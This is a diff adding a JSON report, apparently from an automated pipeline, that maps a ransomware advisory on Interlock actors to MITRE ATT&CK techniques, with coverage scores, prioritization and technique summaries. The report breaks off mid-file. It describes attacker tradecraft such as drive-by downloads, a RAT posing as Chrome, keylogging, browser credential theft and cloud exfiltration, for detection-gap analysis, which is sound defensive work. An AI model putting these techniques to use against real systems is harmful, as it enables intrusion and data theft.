@@ -1,0 +1,1139 @@
+{
+  "meta": {
+    "started": "2026-10-18T18:15:20+00:00",
+    "finished": "2026-10-18T18:15:20+00:00",
+    "model": "gemini-3.8-flash",
+    "temperature": 0,
+    "demo": false,
+    "attack_version": "19.2",
+    "analyst_mode": "auto",
+    "replicate": 4,
+    "private": false,
+    "llm_sources": [
+      "gemini-api"
+    ],
+    "fake": false,
+    "model_versions": [
+      "gemini-3.8-flash"
+    ],
+    "summary_replicate": 0,
+    "report_sha256": "7d9aea74e64b3277c05e1676c0cb975e0a17200c041981347067230a7ff8b79c",
+    "prompt_sha256": [
+      "10ed1dcbbfd3c65083d7e1f4376dedb6fc9d1f315b00bb0a375938a711344043"
+    ]
+  },
+  "extraction": {
+    "report_sha256": "7d9aea74e64b3277c05e1676c0cb975e0a17200c041981347067230a7ff8b79c",
+    "attack_version": "19.2",
+    "chunks": 1,
+    "extracted_raw": [
+      {
+        "technique_id": "T1189",
+        "technique_name": "Drive-by Compromise",
+        "evidence_quote": "FBI observed actors obtaining initial access via drive-by download from compromised legitimate websites, which is an uncommon method among ransomware groups."
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting Interpreter: PowerShell",
+        "evidence_quote": "the fake Google Chrome browser executable functions as a remote access trojan (RAT) designed to execute a PowerShell script that drops a file into the Windows Startup folder."
+      },
+      {
+        "technique_id": "T1547.001",
+        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "evidence_quote": "drops a file into the Windows Startup folder. From there, the file is designed to run the RAT every time the victim logs in, establishing persistence."
+      },
+      {
+        "technique_id": "T1033",
+        "technique_name": "System Owner/User Discovery",
+        "evidence_quote": "WindowsIdentity.GetCurrent() | Returns a WindowsIdentity object that represents the current Windows user."
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "evidence_quote": "systeminfo | Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties."
+      },
+      {
+        "technique_id": "T1057",
+        "technique_name": "Process Discovery",
+        "evidence_quote": "tasklist/svc | Lists unabridged service information for each process currently running on the local computer."
+      },
+      {
+        "technique_id": "T1007",
+        "technique_name": "System Service Discovery",
+        "evidence_quote": "Get-Service | Gets objects that represent the services on a computer, including running and stopped services."
+      },
+      {
+        "technique_id": "T1056.001",
+        "technique_name": "Input Capture: Keylogging",
+        "evidence_quote": "the keylogger dynamic link library (DLL) logs users’ keystrokes in a file named conhost.txt."
+      },
+      {
+        "technique_id": "T1555.003",
+        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+        "evidence_quote": "According to open source reporting, the credential stealer collects login information and associated URLs for victims’ online accounts"
+      },
+      {
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Services: Remote Desktop Protocol",
+        "evidence_quote": "Interlock actors leverage compromised credentials and Remote Desktop Protocol (RDP)10 to move between systems."
+      },
+      {
+        "technique_id": "T1219",
+        "technique_name": "Remote Access Software",
+        "evidence_quote": "AnyDesk | A common legitimate remote monitoring and management (RMM) tool maliciously used by Interlock actors to obtain remote access and maintain persistence."
+      },
+      {
+        "technique_id": "T1567.002",
+        "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+        "evidence_quote": "According to open source reporting, Interlock actors execute AzCopy to exfiltrate data by uploading it to the Azure storage blob."
+      },
+      {
+        "technique_id": "T1218.011",
+        "technique_name": "System Binary Proxy Execution: Rundll32",
+        "evidence_quote": "A cybersecurity company identified a DLL binary named tmp41.wasd—executed after encryption using rundll32.exe—which uses the remove() function to delete the encryption binary"
+      },
+      {
+        "technique_id": "T1070.004",
+        "technique_name": "Indicator Removal: File Deletion",
+        "evidence_quote": "which uses the remove() function to delete the encryption binary; on Linux machines, the encryptor uses a similar technique to execute the removeme function."
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "evidence_quote": "Encryptors are designed to encrypt files using a combined Advanced Encryption Standard (AES) and Rivest-Shamir-Adleman (RSA) algorithm."
+      }
+    ],
+    "extra_fields": [],
+    "candidates": [
+      {
+        "technique_id": "T1189",
+        "llm_name": "Drive-by Compromise",
+        "official_name": "Drive-by Compromise",
+        "evidence_quote": "FBI observed actors obtaining initial access via drive-by download from compromised legitimate websites, which is an uncommon method among ransomware groups.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1059.001",
+        "llm_name": "Command and Scripting Interpreter: PowerShell",
+        "official_name": "PowerShell",
+        "evidence_quote": "the fake Google Chrome browser executable functions as a remote access trojan (RAT) designed to execute a PowerShell script that drops a file into the Windows Startup folder.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1547.001",
+        "llm_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "official_name": "Registry Run Keys / Startup Folder",
+        "evidence_quote": "drops a file into the Windows Startup folder. From there, the file is designed to run the RAT every time the victim logs in, establishing persistence.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1033",
+        "llm_name": "System Owner/User Discovery",
+        "official_name": "System Owner/User Discovery",
+        "evidence_quote": "WindowsIdentity.GetCurrent() | Returns a WindowsIdentity object that represents the current Windows user.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1082",
+        "llm_name": "System Information Discovery",
+        "official_name": "System Information Discovery",
+        "evidence_quote": "systeminfo | Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1057",
+        "llm_name": "Process Discovery",
+        "official_name": "Process Discovery",
+        "evidence_quote": "tasklist/svc | Lists unabridged service information for each process currently running on the local computer.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1007",
+        "llm_name": "System Service Discovery",
+        "official_name": "System Service Discovery",
+        "evidence_quote": "Get-Service | Gets objects that represent the services on a computer, including running and stopped services.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1056.001",
+        "llm_name": "Input Capture: Keylogging",
+        "official_name": "Keylogging",
+        "evidence_quote": "the keylogger dynamic link library (DLL) logs users’ keystrokes in a file named conhost.txt.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1555.003",
+        "llm_name": "Credentials from Password Stores: Credentials from Web Browsers",
+        "official_name": "Credentials from Web Browsers",
+        "evidence_quote": "According to open source reporting, the credential stealer collects login information and associated URLs for victims’ online accounts",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1021.001",
+        "llm_name": "Remote Services: Remote Desktop Protocol",
+        "official_name": "Remote Desktop Protocol",
+        "evidence_quote": "Interlock actors leverage compromised credentials and Remote Desktop Protocol (RDP)10 to move between systems.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1219",
+        "llm_name": "Remote Access Software",
+        "official_name": "Remote Access Tools",
+        "evidence_quote": "AnyDesk | A common legitimate remote monitoring and management (RMM) tool maliciously used by Interlock actors to obtain remote access and maintain persistence.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1567.002",
+        "llm_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+        "official_name": "Exfiltration to Cloud Storage",
+        "evidence_quote": "According to open source reporting, Interlock actors execute AzCopy to exfiltrate data by uploading it to the Azure storage blob.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1218.011",
+        "llm_name": "System Binary Proxy Execution: Rundll32",
+        "official_name": "Rundll32",
+        "evidence_quote": "A cybersecurity company identified a DLL binary named tmp41.wasd—executed after encryption using rundll32.exe—which uses the remove() function to delete the encryption binary",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      },
+      {
+        "technique_id": "T1070.004",
+        "llm_name": "Indicator Removal: File Deletion",
+        "official_name": "File Deletion",
+        "evidence_quote": "which uses the remove() function to delete the encryption binary; on Linux machines, the encryptor uses a similar technique to execute the removeme function.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": false
+      },
+      {
+        "technique_id": "T1486",
+        "llm_name": "Data Encrypted for Impact",
+        "official_name": "Data Encrypted for Impact",
+        "evidence_quote": "Encryptors are designed to encrypt files using a combined Advanced Encryption Standard (AES) and Rivest-Shamir-Adleman (RSA) algorithm.",
+        "status": "valid",
+        "replacement": null,
+        "needs_review": false,
+        "quote_found": true
+      }
+    ],
+    "analyst_mode": "auto",
+    "analyst_actions": [
+      {
+        "action": "accept",
+        "technique_id": "T1486",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1070.004",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1218.011",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1567.002",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1219",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1021.001",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1555.003",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1056.001",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1007",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1057",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1082",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1033",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1547.001",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1059.001",
+        "note": ""
+      },
+      {
+        "action": "accept",
+        "technique_id": "T1189",
+        "note": ""
+      }
+    ],
+    "extracted_validated": [
+      {
+        "technique_id": "T1189",
+        "technique_name": "Drive-by Compromise",
+        "evidence_quote": "FBI observed actors obtaining initial access via drive-by download from compromised legitimate websites, which is an uncommon method among ransomware groups.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "PowerShell",
+        "evidence_quote": "the fake Google Chrome browser executable functions as a remote access trojan (RAT) designed to execute a PowerShell script that drops a file into the Windows Startup folder.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1547.001",
+        "technique_name": "Registry Run Keys / Startup Folder",
+        "evidence_quote": "drops a file into the Windows Startup folder. From there, the file is designed to run the RAT every time the victim logs in, establishing persistence.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1033",
+        "technique_name": "System Owner/User Discovery",
+        "evidence_quote": "WindowsIdentity.GetCurrent() | Returns a WindowsIdentity object that represents the current Windows user.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "evidence_quote": "systeminfo | Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1057",
+        "technique_name": "Process Discovery",
+        "evidence_quote": "tasklist/svc | Lists unabridged service information for each process currently running on the local computer.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1007",
+        "technique_name": "System Service Discovery",
+        "evidence_quote": "Get-Service | Gets objects that represent the services on a computer, including running and stopped services.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1056.001",
+        "technique_name": "Keylogging",
+        "evidence_quote": "the keylogger dynamic link library (DLL) logs users’ keystrokes in a file named conhost.txt.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1555.003",
+        "technique_name": "Credentials from Web Browsers",
+        "evidence_quote": "According to open source reporting, the credential stealer collects login information and associated URLs for victims’ online accounts",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "evidence_quote": "Interlock actors leverage compromised credentials and Remote Desktop Protocol (RDP)10 to move between systems.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1219",
+        "technique_name": "Remote Access Tools",
+        "evidence_quote": "AnyDesk | A common legitimate remote monitoring and management (RMM) tool maliciously used by Interlock actors to obtain remote access and maintain persistence.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1567.002",
+        "technique_name": "Exfiltration to Cloud Storage",
+        "evidence_quote": "According to open source reporting, Interlock actors execute AzCopy to exfiltrate data by uploading it to the Azure storage blob.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1218.011",
+        "technique_name": "Rundll32",
+        "evidence_quote": "A cybersecurity company identified a DLL binary named tmp41.wasd—executed after encryption using rundll32.exe—which uses the remove() function to delete the encryption binary",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1070.004",
+        "technique_name": "File Deletion",
+        "evidence_quote": "which uses the remove() function to delete the encryption binary; on Linux machines, the encryptor uses a similar technique to execute the removeme function.",
+        "origin": "llm"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "evidence_quote": "Encryptors are designed to encrypt files using a combined Advanced Encryption Standard (AES) and Rivest-Shamir-Adleman (RSA) algorithm.",
+        "origin": "llm"
+      }
+    ],
+    "llm_calls": [
+      {
+        "purpose": "step1_extract[1/1]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:12:09+00:00",
+        "temperature": 0,
+        "prompt_sha256": "10ed1dcbbfd3c65083d7e1f4376dedb6fc9d1f315b00bb0a375938a711344043",
+        "replicate": 4,
+        "cache_key": "fbd4d543b5a6d5644b33f7956e8a35e7f47ff6f99688db4d165f81dab3fd81b4",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "extract_v1.txt",
+        "raw_response": "{\n  \"techniques\": [\n    {\n      \"technique_id\": \"T1189\",\n      \"technique_name\": \"Drive-by Compromise\",\n      \"evidence_quote\": \"FBI observed actors obtaining initial access via drive-by download from compromised legitimate websites, which is an uncommon method among ransomware groups.\"\n    },\n    {\n      \"technique_id\": \"T1059.001\",\n      \"technique_name\": \"Command and Scripting Interpreter: PowerShell\",\n      \"evidence_quote\": \"the fake Google Chrome browser executable functions as a remote access trojan (RAT) designed to execute a PowerShell script that drops a file into the Windows Startup folder.\"\n    },\n    {\n      \"technique_id\": \"T1547.001\",\n      \"technique_name\": \"Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder\",\n      \"evidence_quote\": \"drops a file into the Windows Startup folder. From there, the file is designed to run the RAT every time the victim logs in, establishing persistence.\"\n    },\n    {\n      \"technique_id\": \"T1033\",\n      \"technique_name\": \"System Owner/User Discovery\",\n      \"evidence_quote\": \"WindowsIdentity.GetCurrent() | Returns a WindowsIdentity object that represents the current Windows user.\"\n    },\n    {\n      \"technique_id\": \"T1082\",\n      \"technique_name\": \"System Information Discovery\",\n      \"evidence_quote\": \"systeminfo | Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties.\"\n    },\n    {\n      \"technique_id\": \"T1057\",\n      \"technique_name\": \"Process Discovery\",\n      \"evidence_quote\": \"tasklist/svc | Lists unabridged service information for each process currently running on the local computer.\"\n    },\n    {\n      \"technique_id\": \"T1007\",\n      \"technique_name\": \"System Service Discovery\",\n      \"evidence_quote\": \"Get-Service | Gets objects that represent the services on a computer, including running and stopped services.\"\n    },\n    {\n      \"technique_id\": \"T1056.001\",\n      \"technique_name\": \"Input Capture: Keylogging\",\n      \"evidence_quote\": \"the keylogger dynamic link library (DLL) logs users’ keystrokes in a file named conhost.txt.\"\n    },\n    {\n      \"technique_id\": \"T1555.003\",\n      \"technique_name\": \"Credentials from Password Stores: Credentials from Web Browsers\",\n      \"evidence_quote\": \"According to open source reporting, the credential stealer collects login information and associated URLs for victims’ online accounts\"\n    },\n    {\n      \"technique_id\": \"T1021.001\",\n      \"technique_name\": \"Remote Services: Remote Desktop Protocol\",\n      \"evidence_quote\": \"Interlock actors leverage compromised credentials and Remote Desktop Protocol (RDP)10 to move between systems.\"\n    },\n    {\n      \"technique_id\": \"T1219\",\n      \"technique_name\": \"Remote Access Software\",\n      \"evidence_quote\": \"AnyDesk | A common legitimate remote monitoring and management (RMM) tool maliciously used by Interlock actors to obtain remote access and maintain persistence.\"\n    },\n    {\n      \"technique_id\": \"T1567.002\",\n      \"technique_name\": \"Exfiltration Over Web Service: Exfiltration to Cloud Storage\",\n      \"evidence_quote\": \"According to open source reporting, Interlock actors execute AzCopy to exfiltrate data by uploading it to the Azure storage blob.\"\n    },\n    {\n      \"technique_id\": \"T1218.011\",\n      \"technique_name\": \"System Binary Proxy Execution: Rundll32\",\n      \"evidence_quote\": \"A cybersecurity company identified a DLL binary named tmp41.wasd—executed after encryption using rundll32.exe—which uses the remove() function to delete the encryption binary\"\n    },\n    {\n      \"technique_id\": \"T1070.004\",\n      \"technique_name\": \"Indicator Removal: File Deletion\",\n      \"evidence_quote\": \"which uses the remove() function to delete the encryption binary; on Linux machines, the encryptor uses a similar technique to execute the removeme function.\"\n    },\n    {\n      \"technique_id\": \"T1486\",\n      \"technique_name\": \"Data Encrypted for Impact\",\n      \"evidence_quote\": \"Encryptors are designed to encrypt files using a combined Advanced Encryption Standard (AES) and Rivest-Shamir-Adleman (RSA) algorithm.\"\n    }\n  ]\n}"
+      }
+    ]
+  },
+  "coverage": [
+    {
+      "technique_id": "T1189",
+      "coverage": "sin cobertura",
+      "score": null,
+      "data_sources": [],
+      "basis": "no_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1059.001",
+      "coverage": "cubierta",
+      "score": 5,
+      "data_sources": [
+        "Script Execution",
+        "Process Creation"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1547.001",
+      "coverage": "parcial",
+      "score": 3,
+      "data_sources": [
+        "Windows Registry Key Modification"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1033",
+      "coverage": "sin cobertura",
+      "score": null,
+      "data_sources": [],
+      "basis": "no_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1082",
+      "coverage": "sin cobertura",
+      "score": null,
+      "data_sources": [],
+      "basis": "no_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1057",
+      "coverage": "sin cobertura",
+      "score": null,
+      "data_sources": [],
+      "basis": "no_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1007",
+      "coverage": "parcial",
+      "score": 1,
+      "data_sources": [
+        "Command Execution"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1056.001",
+      "coverage": "parcial",
+      "score": 1,
+      "data_sources": [
+        "Driver Load"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1555.003",
+      "coverage": "parcial",
+      "score": 2,
+      "data_sources": [
+        "File Access"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1021.001",
+      "coverage": "parcial",
+      "score": 3,
+      "data_sources": [
+        "Logon Session Creation",
+        "Network Connection Creation"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1219",
+      "coverage": "cubierta",
+      "score": 4,
+      "data_sources": [
+        "Process Creation",
+        "Network Connection Creation"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1567.002",
+      "coverage": "sin cobertura",
+      "score": null,
+      "data_sources": [],
+      "basis": "no_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1218.011",
+      "coverage": "cubierta",
+      "score": 4,
+      "data_sources": [
+        "Process Creation",
+        "Module Load"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1070.004",
+      "coverage": "parcial",
+      "score": 2,
+      "data_sources": [
+        "File Deletion"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    },
+    {
+      "technique_id": "T1486",
+      "coverage": "cubierta",
+      "score": 5,
+      "data_sources": [
+        "File Modification",
+        "File Creation"
+      ],
+      "basis": "own_entry",
+      "inherited_from": null
+    }
+  ],
+  "prioritization": [
+    {
+      "technique_id": "T1189",
+      "technique_name": "Drive-by Compromise",
+      "tactics": [
+        "initial-access"
+      ],
+      "coverage_original": "sin cobertura",
+      "coverage_validated": "sin cobertura",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": "interna",
+      "action": "Attend",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1059.001",
+      "technique_name": "PowerShell",
+      "tactics": [
+        "execution"
+      ],
+      "coverage_original": "cubierta",
+      "coverage_validated": "cubierta",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1547.001",
+      "technique_name": "Registry Run Keys / Startup Folder",
+      "tactics": [
+        "persistence",
+        "privilege-escalation"
+      ],
+      "coverage_original": "parcial",
+      "coverage_validated": "parcial",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track*",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "tactics": [
+        "discovery"
+      ],
+      "coverage_original": "sin cobertura",
+      "coverage_validated": "sin cobertura",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Attend",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1082",
+      "technique_name": "System Information Discovery",
+      "tactics": [
+        "discovery"
+      ],
+      "coverage_original": "sin cobertura",
+      "coverage_validated": "sin cobertura",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Attend",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1057",
+      "technique_name": "Process Discovery",
+      "tactics": [
+        "discovery"
+      ],
+      "coverage_original": "sin cobertura",
+      "coverage_validated": "sin cobertura",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Attend",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1007",
+      "technique_name": "System Service Discovery",
+      "tactics": [
+        "discovery"
+      ],
+      "coverage_original": "parcial",
+      "coverage_validated": "parcial",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track*",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1056.001",
+      "technique_name": "Keylogging",
+      "tactics": [
+        "credential-access",
+        "collection"
+      ],
+      "coverage_original": "parcial",
+      "coverage_validated": "parcial",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track*",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1555.003",
+      "technique_name": "Credentials from Web Browsers",
+      "tactics": [
+        "credential-access"
+      ],
+      "coverage_original": "parcial",
+      "coverage_validated": "parcial",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track*",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1021.001",
+      "technique_name": "Remote Desktop Protocol",
+      "tactics": [
+        "lateral-movement"
+      ],
+      "coverage_original": "parcial",
+      "coverage_validated": "parcial",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track*",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1219",
+      "technique_name": "Remote Access Tools",
+      "tactics": [
+        "command-and-control"
+      ],
+      "coverage_original": "cubierta",
+      "coverage_validated": "cubierta",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1567.002",
+      "technique_name": "Exfiltration to Cloud Storage",
+      "tactics": [
+        "exfiltration"
+      ],
+      "coverage_original": "sin cobertura",
+      "coverage_validated": "sin cobertura",
+      "coverage_change_reason": "",
+      "asset_id": "m365",
+      "criticality": "alta",
+      "exposure": null,
+      "action": "Act",
+      "context_source": "analyst_context"
+    },
+    {
+      "technique_id": "T1218.011",
+      "technique_name": "Rundll32",
+      "tactics": [
+        "stealth"
+      ],
+      "coverage_original": "cubierta",
+      "coverage_validated": "cubierta",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1070.004",
+      "technique_name": "File Deletion",
+      "tactics": [
+        "stealth"
+      ],
+      "coverage_original": "parcial",
+      "coverage_validated": "parcial",
+      "coverage_change_reason": "",
+      "asset_id": "workstations",
+      "criticality": "media",
+      "exposure": null,
+      "action": "Track*",
+      "context_source": "default_asset"
+    },
+    {
+      "technique_id": "T1486",
+      "technique_name": "Data Encrypted for Impact",
+      "tactics": [
+        "impact"
+      ],
+      "coverage_original": "cubierta",
+      "coverage_validated": "cubierta",
+      "coverage_change_reason": "",
+      "asset_id": "erp-db",
+      "criticality": "alta",
+      "exposure": null,
+      "action": "Track*",
+      "context_source": "analyst_context"
+    }
+  ],
+  "summaries": [
+    {
+      "technique_id": "T1189",
+      "source_description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised, allowing adversaries to inject malicious code\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)\n\nBrowser push notifications may also be abused by adversaries and leveraged for malicious code injection via User Execution. By clicking \"allow\" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",
+      "raw_summary": "{\"summary\": \"Adversaries can gain access to client endpoints and internal networks when a user visits a website hosting malicious content during normal browsing. Exploit code can be delivered through compromised legitimate websites, modified cloud scripts, malvertising, user-controllable web interfaces, or abused browser push notifications. In targeted campaigns known as strategic web compromises or watering hole attacks, adversaries often focus on sites visited by specific communities to exploit vulnerable browser software.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1189]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T17:58:46+00:00",
+        "temperature": 0,
+        "prompt_sha256": "1df0e4483d5e2692e733fdae2cd2d66bab92873480a670347f699d212a746fc2",
+        "replicate": 0,
+        "cache_key": "7ba037c5eb4d78ed0ebec13b28e6b526d0e16283f58bf3fabae2883bf5fd7002",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1059.001",
+      "source_description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the.NET framework and Windows Common Language Interface (CLI).",
+      "raw_summary": "{\"summary\": \"Adversaries may abuse PowerShell to discover information, execute code, and download and run executables from disk or in memory. Several offensive testing tools, including Empire, PowerSploit, PoshC2, and PSAttack, utilize PowerShell for these actions. Commands and scripts can also be executed without invoking the powershell.exe binary by interfacing with the underlying System.Management.Automation assembly DLL.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1059.001]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:06:54+00:00",
+        "temperature": 0,
